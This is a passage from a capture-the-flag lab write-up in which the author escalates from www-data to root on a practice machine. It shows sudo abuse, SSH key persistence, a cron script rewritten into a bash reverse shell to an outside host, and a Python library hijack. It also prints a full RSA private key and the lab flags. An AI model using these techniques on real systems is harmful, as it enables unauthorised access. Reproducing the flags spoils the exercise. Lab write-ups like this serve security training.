Since our foothold user `www-data` have permission for `toby`. I went ahead and enumeration `toby's` home directory.

```bash
www-data@ip-10-48-158-241:/home/toby$ ls -la
total 44
drwxr-xr-x 6 toby toby 4096 Dec 12  2020 .
drwxr-xr-x 7 root root 4096 Dec 16 07:45 ..
lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 toby toby  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 toby toby 3771 Dec  3  2020 .bashrc
drwx------ 2 toby toby 4096 Dec  3  2020 .cache
drwx------ 3 toby toby 4096 Dec  3  2020 .gnupg
drwxrwxr-x 3 toby toby 4096 Dec  3  2020 .local
-rw-r--r-- 1 toby toby  807 Dec  3  2020 .profile
-rw------- 1 toby toby   21 Dec  3  2020 flag_4.txt
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 jobs
-rw-r--r-- 1 mat  mat    89 Dec 12  2020 note.txt
www-data@ip-10-48-158-241:/home/toby$ cat flag_4.txt 
cat: flag_4.txt: Permission denied
www-data@ip-10-48-158-241:/home/toby$ sudo -u toby cat flag_4.txt 
FLAG{chad_lifestyle}
www-data@ip-10-48-158-241:/home/toby$ 

```

`FLAG_4:` FLAG{chad_lifestyle}

##### note.txt

```bash
www-data@ip-10-48-158-241:/home/toby$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
www-data@ip-10-48-158-241:/home/toby$ 

```

With this information, I assume that our `Privilege escalation` would be cronjobs. I remember seeing a cronjob earlier on my enumeration. 
`*/1 * * * * mat /home/toby/jobs/cow.sh`

```bash
www-data@ip-10-48-158-241:/home/toby/jobs$ cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

That's weird. Why do they need a cronjob for an image. Since this is owned by `toby`, technically i can write on this. I'll try to put a simple `bash -p` and see if it will spawn `toby's` shell for me and it worked! 

```bash
www-data@ip-10-48-158-241:/home/toby/jobs$ sudo -u toby ./cow.sh
toby@ip-10-48-158-241:~/jobs$ id
uid=1003(toby) gid=1003(toby) groups=1003(toby)

```

I want to setup persistence for `toby` so I made `.ssh` folder and created `authorized_keys` then put my `public key` from my local machine. 

```bash
toby@ip-10-48-158-241:~$ mkdir -p .ssh
toby@ip-10-48-158-241:~$ chmod 700 .ssh
toby@ip-10-48-158-241:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA......" >> authorized_keys
toby@ip-10-48-158-241:~/.ssh$ chmod 600 authorized_keys
```

```bash
                                                                                                                                                                                                                  
┌──(haz0x㉿kali)-[~/.ssh]
└─$ ssh -i id_ed25519 toby@10.48.158.241         
The authenticity of host '10.48.158.241 (10.48.158.241)' can't be established.
ED25519 key fingerprint is: SHA256:+fB4Eqy7qHDuJ0TurgXhKGSCkFznUp+KSIdhN5pxmhc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.158.241' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 16 Dec 11:00:42 UTC 2025

  System load:  0.0                Processes:             145
  Usage of /:   28.4% of 18.53GB   Users logged in:       0
  Memory usage: 18%                IPv4 address for eth0: 10.48.158.241
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Thu Dec  3 02:40:13 2020 from 192.168.153.128
toby@ip-10-48-158-241:~$ 

```

Now we have persistence and stable shell as `toby`. I will now start enumerating all users

```bash
toby@ip-10-48-158-241:/home$ ls -la
total 28
drwxr-xr-x  7 root   root   4096 Dec 16 07:45 .
drwxr-xr-x 24 root   root   4096 Dec 16 07:45 ..
dr-xr-xr-x  3 root   root   4096 Dec  3  2020 ftpuser
drwxr-xr-x  6 mat    mat    4096 Dec  3  2020 mat
drwxr-xr-x  7 toby   toby   4096 Dec 16 10:57 toby
drwxr-xr-x  3 ubuntu ubuntu 4096 Dec 16 07:45 ubuntu
drwxr-xr-x  5 will   will   4096 Dec  3  2020 will
toby@ip-10-48-158-241:/home$ 

```

We can read all users. Based on the uid's, I believe my next target user is `mat`. Time to enumerate `mat`.

```bash
toby@ip-10-48-158-241:/home/mat$ ls -la
total 312
drwxr-xr-x 6 mat  mat    4096 Dec  3  2020 .
drwxr-xr-x 7 root root   4096 Dec 16 07:45 ..
lrwxrwxrwx 1 root root      9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 mat  mat     220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 mat  mat    3771 Dec  3  2020 .bashrc
drwx------ 2 mat  mat    4096 Dec  3  2020 .cache
-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
drwx------ 3 mat  mat    4096 Dec  3  2020 .gnupg
drwxrwxr-x 3 mat  mat    4096 Dec  3  2020 .local
-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
-rw-r--r-- 1 mat  mat     807 Dec  3  2020 .profile
drwxrwxr-x 2 will will   4096 Dec  3  2020 scripts
toby@ip-10-48-158-241:/home/mat$ cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
toby@ip-10-48-158-241:/home/mat$ 

```

I believe this can be exploited as `SUID` but the problem is, my current user isn't `mat`. I'm still confused as to why there is a `cow.jpg` on `mat's` directory. I think that it is being copied to `/tmp` for a reason. Maybe there's a hidden message. I will transfer it to my machine and see if there's any hidden message on it. 

```bash
toby@ip-10-48-158-241:/tmp$ ls
cow.jpg                                                                       systemd-private-aa40429327974044a6a1e6b08070ee4a-systemd-logind.service-1VBSYh
snap-private-tmp                                                              systemd-private-aa40429327974044a6a1e6b08070ee4a-systemd-resolved.service-lwGhih
systemd-private-aa40429327974044a6a1e6b08070ee4a-apache2.service-4AkdWh       systemd-private-aa40429327974044a6a1e6b08070ee4a-systemd-timesyncd.service-Ou45Wg
systemd-private-aa40429327974044a6a1e6b08070ee4a-ModemManager.service-usPBBg
toby@ip-10-48-158-241:/tmp$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


┌──(haz0x㉿kali)-[/tmp]
└─$ wget 10.48.158.241:8000/cow.jpg        
Prepended http:// to '10.48.158.241:8000/cow.jpg'
--2025-12-16 03:26:17--  http://10.48.158.241:8000/cow.jpg
Connecting to 10.48.158.241:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 270433 (264K) [image/jpeg]
Saving to: ‘cow.jpg’

cow.jpg                                              100%[====================================================================================================================>] 264.09K   525KB/s    in 0.5s    

2025-12-16 03:26:17 (525 KB/s) - ‘cow.jpg’ saved [270433/270433]
```

Let's do some `Image forensics stuff`

```bash
┌──(haz0x㉿kali)-[/tmp]
└─$ exiftool cow.jpg                                                        
ExifTool Version Number         : 13.36
File Name                       : cow.jpg
Directory                       : .
File Size                       : 270 kB
File Modification Date/Time     : 2025:12:16 02:48:01-08:00
File Access Date/Time           : 2025:12:16 03:26:17-08:00
File Inode Change Date/Time     : 2025:12:16 03:26:17-08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 40%
IPTC Digest                     : 00000000000000000000000000000000
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1600
Image Height                    : 1064
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1600x1064
Megapixels                      : 1.7
                                                                                                                                                                                                                  
┌──(haz0x㉿kali)-[/tmp]
└─$ binwalk -e cow.jpg     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                                                                                  
┌──(haz0x㉿kali)-[/tmp]
└─$ stegseek cow.jpg "$ROCKYOU"                                             
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.65% (133.0 MB)           
[!] error: Could not find a valid passphrase.

```

Didn't get anything with `cow.jpg`. Moving on...

The cronjob I used earlier, I realized I can use it to escalate to `mat`. The file is owned by `toby` which is why i became `toby`. But as a cronjob, it is owned by `mat`. I can edit that to a `Reverse shell`. Setup a listener and wait.

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.133.134/9292 0>&1'
```

On my `Kali Machine`, setup a listener and wait 

```bash
┌──(haz0x㉿kali)-[~/.ssh]
└─$ nc -lvnp 9292                                 
listening on [any] 9292 ...
connect to [192.168.133.134] from (UNKNOWN) [10.48.158.241] 46512
bash: cannot set terminal process group (5236): Inappropriate ioctl for device
bash: no job control in this shell
mat@ip-10-48-158-241:~$ cat flag_5.txt

FLAG{live_by_the_cow_die_by_the_cow}
```

`FLAG 5:` FLAG{live_by_the_cow_die_by_the_cow}

Here, I don't need to setup persistence. The script is running every minute so I can access `mat` anytime.

Remember the `note.txt` from mat's directory. It reads 

```
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

```bash
mat@ip-10-48-158-241:~$ sudo -l
Matching Defaults entries for mat on ip-10-48-158-241:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-48-158-241:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *

```

##### will_script.py

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
mat@ip-10-48-158-241:~/scripts$ 
```

##### cmd.py

```python
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

So base on my understanding, `will's` script is actually importing from the `cmd.py` owned by `mat`. At the end of `will's` script, it says `os.system(cmd)`. I could probably exploit that. 

I changed `cmd.py` script to where it will spawn a shell.

```python
import os 
def get_command(num): 
	os.system("/bin/bash") 
	return "ls -lah"
```

```bash
mat@ip-10-48-158-241:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
will@ip-10-48-158-241:/home/mat/scripts$ 
```

```bash
will@ip-10-48-158-241:/home$ cd will
will@ip-10-48-158-241:~$ ls -la
total 36
drwxr-xr-x 5 will will 4096 Dec  3  2020 .
drwxr-xr-x 7 root root 4096 Dec 16 07:45 ..
lrwxrwxrwx 1 will will    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 will will  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 will will 3771 Dec  3  2020 .bashrc
drwx------ 2 will will 4096 Dec  3  2020 .cache
drwxr-x--- 3 will will 4096 Dec  3  2020 .config
-rw------- 1 will will   41 Dec  3  2020 flag_6.txt
drwx------ 3 will will 4096 Dec  3  2020 .gnupg
-rw-r--r-- 1 will will  807 Dec  3  2020 .profile
-rw-r--r-- 1 will will    0 Dec  3  2020 .sudo_as_admin_successful
will@ip-10-48-158-241:~$ cat flag_6.txt 
FLAG{but_i_thought_my_script_was_secure}
will@ip-10-48-158-241:~$ 

```

`FLAG 6:` FLAG{but_i_thought_my_script_was_secure}

As I enumerate `will`, I noticed a very familiar GID which is `adm`.

```bash
will@ip-10-48-158-241:~$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)

will@ip-10-48-158-241:~$ find / -gid 4 2>/dev/null
/opt/backups
/opt/backups/key.b64

```

Right. The backup files in `/opt`. Upon checking, it is a `Base 64 encoded Private Key`

```bash
will@ip-10-48-158-241:/opt/backups$ ls -la
total 12
drwxrwx--- 2 root adm  4096 Dec  3  2020 .
drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
-rw-rw---- 1 root adm  2270 Dec  3  2020 key.b64
will@ip-10-48-158-241:/opt/backups$ cat key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
will@ip-10-48-158-241:/opt/backups$ 

```

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

Now the only user left is root. Let's try it.

First save the key and add proper perms


```bash
will@ip-10-48-158-241:/tmp$ nano id_rsa
will@ip-10-48-158-241:/tmp$ chmod 600 id_rsa
will@ip-10-48-158-241:/tmp$ ssh -i id_rsa root@localhost
```

It worked!

```bash
Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat May 10 16:33:27 2025 from 10.23.8.228
root@ip-10-48-158-241:~# cat flag_7.txt
FLAG{who_watches_the_watchers}
```

`FLAG 7:` FLAG{who_watches_the_watchers}

# GG!